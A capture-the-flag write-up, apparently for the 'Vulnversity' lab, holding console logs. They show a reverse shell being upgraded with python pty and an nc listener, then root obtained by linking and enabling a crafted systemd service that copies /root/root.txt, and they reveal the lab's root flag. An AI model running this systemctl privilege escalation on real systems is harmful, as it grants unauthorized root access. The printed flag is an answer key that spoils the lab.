## Upgrade shell after reverse shell

```console
www-data@vulnuniversity:/home/bill$ python -c 'import pty;pty.spawn("/bin/bash")'
<me/bill$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@vulnuniversity:/home/bill$ export TERM=xterm
export TERM=xterm                          
www-data@vulnuniversity:/home/bill$ ^Z     
[1]+  Stopped                 nc -lnvp 1234
root@kali:~/thm/vulnversity# stty raw -echo; fg 
```

## Privesc

```console
www-data@vulnuniversity:/tmp$ TF=$(mktemp).service
www-data@vulnuniversity:/tmp$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/rootflag"
> [Install]
> WantedBy=multi-user.target' > $TF
www-data@vulnuniversity:/tmp$ systemctl link $TF
Created symlink from /etc/systemd/system/tmp.pXlFAo30Ks.service to /tmp/tmp.pXlFAo30Ks.service.
www-data@vulnuniversity:/tmp$ systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.pXlFAo30Ks.service to /tmp/tmp.pXlFAo30Ks.service.
www-data@vulnuniversity:/tmp$ ls
output
rootflag
systemd-private-463fa22b43114934891206b06835fd55-systemd-timesyncd.service-aOnnTW
tmp.Ai7vuotPuE
tmp.Ai7vuotPuE.service
tmp.pXlFAo30Ks
tmp.pXlFAo30Ks.service
www-data@vulnuniversity:/tmp$ cat rootflag 
a58ff8579f0a9270368d33a9966c7fd5
www-data@vulnuniversity:/tmp$ exit
www-data@vulnuniversity:/home/bill$ exit
```